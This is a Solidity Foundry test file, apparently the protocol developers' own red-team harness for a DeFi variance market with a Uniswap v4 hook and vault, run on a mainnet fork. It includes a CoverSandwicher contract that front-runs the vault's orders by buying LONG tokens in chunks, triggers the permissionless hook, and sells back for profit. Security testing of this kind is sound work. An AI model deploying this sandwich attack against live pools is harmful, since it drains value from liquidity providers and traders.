// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {ISwapVM} from "swap-vm/interfaces/ISwapVM.sol";
import {TakerTraitsLib} from "swap-vm/libs/TakerTraits.sol";
import {FixedPointMathLib as FPM} from "solady/utils/FixedPointMathLib.sol";

import {VarianceMarket} from "../../src/VarianceMarket.sol";
import {TremorAquaSwapVMRouter} from "../../src/aqua/TremorAquaSwapVMRouter.sol";
import {TremorVault} from "../../src/aqua/TremorVault.sol";
import {TremorHook} from "../../src/hook/TremorHook.sol";
import {PoolOperator} from "../../src/helpers/PoolOperator.sol";
import {TestToken} from "../../src/testnet/TestToken.sol";
import {IVarianceMarket} from "../../src/interfaces/ITremor.sol";
import {MockAggregatorV3} from "../mocks/MockAggregatorV3.sol";

/// @notice Red-team harness: real Aqua + real v4 PoolManager on a mainnet fork (anvil :8545), our own LIVE-build
///         VarianceMarket (ALLOW_PAST_WINDOWS=false unless a test says otherwise) on a mock Chainlink-style feed.
abstract contract RedTeamBase is Test {
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AQUA = 0x1111113CCf1426A8E30e2bfF5E005d929bF6a90a;
    address internal constant POOL_MANAGER = 0x000000000004444c5dc75cB358380D2e3dE08A90;
    address internal constant UNI_ADDR = address(0x1000000000000000000000000000000000000001); // sorts below WETH
    uint160 internal constant HOOK_FLAGS = 0x547;
    uint48 internal constant PENALTY_BLOCKS = 100;

    uint256 internal constant V_CAP = 2.25e18;
    uint256 internal constant V_FWD = 0.33e18;

    struct P {
        bool allowPast;
        uint256 S;
        uint256 lambda;
        uint256 kappa;
        uint256 sets;
        uint256 buyback;
    }

    MockAggregatorV3 internal feed; // settlement feed (ETH/USD style)
    MockAggregatorV3 internal uniFeed; // UNI/ETH conversion guard feed
    VarianceMarket internal market;
    TremorAquaSwapVMRouter internal router;
    TremorVault internal vault;
    TremorHook internal hook;
    PoolOperator internal operator;
    TestToken internal uni;
    PoolKey internal key;
    uint256 internal id;
    address internal longT;
    address internal shortT;
    P internal p;

    // feed path: hourly rounds alternating +-0.6% (~57% annualised vol, close to vFwd)
    uint256 internal lastPx = 3000e8;
    uint256 internal lastTs;
    bool internal up;

    function _fork() internal {
        vm.createSelectFork(vm.envOr("FORK_URL", string("http://127.0.0.1:8545")));
    }

    function forkParams() internal pure returns (P memory) {
        return P(false, 1e18, 2e15, 1e15, 50e18, 5e18);
    }

    function sepoliaParams() internal pure returns (P memory) {
        return P(false, 1e15, 2e12, 1e12, 50e18, 5e15);
    }

    function _deploy(P memory pp) internal {
        p = pp;
        feed = new MockAggregatorV3(1);
        lastTs = block.timestamp - 60;
        feed.push(int256(lastPx), lastTs);
        uniFeed = new MockAggregatorV3(1);
        uniFeed.push(0.0025e18, block.timestamp);

        market = new VarianceMarket(WETH, address(feed), pp.allowPast, 0.05e18, 0.01e18, pp.lambda, pp.kappa, 1 hours, 7 days);
        uint64 t0 = uint64(block.timestamp);
        id = market.createWindow(t0, t0 + 7 days, pp.S, V_CAP, V_FWD);
        IVarianceMarket.WindowView memory w = market.window(id);
        longT = w.long;
        shortT = w.short;

        router = new TremorAquaSwapVMRouter(AQUA, WETH, address(this), "Tremor SwapVM", "1");
        vault = new TremorVault(address(this), AQUA, address(router), address(market));
        deal(WETH, address(vault), FPM.mulDivUp(pp.sets, pp.S, 1e18) + pp.buyback);
        vault.openWindow(id, pp.sets, pp.buyback, t0 + 7 days, keccak256("redteam"));

        deployCodeTo("TestToken.sol:TestToken", abi.encode("UNI", "UNI", address(this)), UNI_ADDR);
        uni = TestToken(UNI_ADDR);
        address hookAddr = address(uint160(0x7E7E << 144) | HOOK_FLAGS);
        deployCodeTo(
            "TremorHook.sol:TremorHook",
            abi.encode(IPoolManager(POOL_MANAGER), address(market), address(uniFeed), address(this), PENALTY_BLOCKS),
            hookAddr
        );
        hook = TremorHook(hookAddr);
        key = PoolKey({
            currency0: Currency.wrap(UNI_ADDR),
            currency1: Currency.wrap(WETH),
            fee: 3000,
            tickSpacing: 60,
            hooks: IHooks(hookAddr)
        });
        // pool at the feed price (WETH per UNI)
        IPoolManager(POOL_MANAGER).initialize(key, uint160(FPM.sqrt(FPM.mulDiv(0.0025e18, uint256(1) << 192, 1e18))));
        hook.setPoolKey(key);
        hook.setCover(address(vault), address(router), id);
        operator = new PoolOperator(IPoolManager(POOL_MANAGER));
    }

    /// @dev push hourly rounds up to `ts`, warp there, ingest everything
    function _advanceTo(uint256 ts) internal {
        while (lastTs + 1 hours <= ts) {
            lastTs += 1 hours;
            lastPx = up ? lastPx * 1006 / 1000 : lastPx * 994 / 1000;
            up = !up;
            feed.push(int256(lastPx), lastTs);
        }
        vm.warp(ts);
        uniFeed.push(0.0025e18, ts); // keep the conversion feed fresh
        for (uint256 i; i < 20; ++i) {
            if (market.checkpoint(id, 64) < 64) break;
        }
        assertTrue(market.caughtUp(id), "caught up");
    }

    function _order() internal view returns (ISwapVM.Order memory) {
        return vault.currentOrder(id);
    }

    function traits(address taker, bool exactIn) internal pure returns (bytes memory) {
        TakerTraitsLib.Args memory a;
        a.taker = taker;
        a.isExactIn = exactIn;
        a.isFirstTransferFromTaker = true;
        a.useTransferFromAndAquaPush = true;
        return TakerTraitsLib.build(a);
    }

    function _bal(address t, address who) internal view returns (uint256) {
        return IERC20(t).balanceOf(who);
    }

    function _mid() internal view returns (uint256) {
        IVarianceMarket.WindowView memory w = market.window(id);
        uint256 v = market.projectedVariance(id);
        return FPM.mulDiv(w.S, v < V_CAP ? v : V_CAP, V_CAP);
    }

    function _logW(string memory label, int256 x) internal pure {
        // signed WETH value printed as wei and as milli-S units
        console2.log(label);
        console2.logInt(x);
    }
}

/// @notice Atomic attacker: front-run buys of LONG in chunks, trigger the permissionless hook, sell back in chunks.
contract CoverSandwicher {
    ISwapVM internal immutable router;
    IVarianceMarket internal immutable market;
    TremorHook internal immutable hook;
    address internal immutable weth;
    address internal immutable long;
    uint256 internal immutable id;

    constructor(address router_, address market_, address hook_, address weth_, address long_, uint256 id_) {
        router = ISwapVM(router_);
        market = IVarianceMarket(market_);
        hook = TremorHook(hook_);
        weth = weth_;
        long = long_;
        id = id_;
        IERC20(weth_).approve(router_, type(uint256).max);
        IERC20(long_).approve(router_, type(uint256).max);
    }

    function _traits(bool exactIn) internal view returns (bytes memory) {
        TakerTraitsLib.Args memory a;
        a.taker = address(this);
        a.isExactIn = exactIn;
        a.isFirstTransferFromTaker = true;
        a.useTransferFromAndAquaPush = true;
        return TakerTraitsLib.build(a);
    }

    /// @param chunks number of buy swaps (and sell swaps); @param longPerChunk LONG bought per swap (exact out)
    function attack(ISwapVM.Order calldata order, uint256 chunks, uint256 longPerChunk) external returns (int256 pnl) {
        uint256 w0 = IERC20(weth).balanceOf(address(this));
        bytes memory tOut = _traits(false);
        bytes memory tIn = _traits(true);
        for (uint256 i; i < chunks; ++i) {
            router.swap(order, weth, long, longPerChunk, tOut);
        }
        hook.handleHookFees(new Currency[](0));
        uint256 bal = IERC20(long).balanceOf(address(this));
        for (uint256 i; i < chunks; ++i) {
            uint256 amt = i + 1 == chunks ? IERC20(long).balanceOf(address(this)) : bal / chunks;
            router.swap(order, long, weth, amt, tIn);
        }
        pnl = int256(IERC20(weth).balanceOf(address(this))) - int256(w0);
        IERC20(weth).transfer(msg.sender, IERC20(weth).balanceOf(address(this)));
    }
}
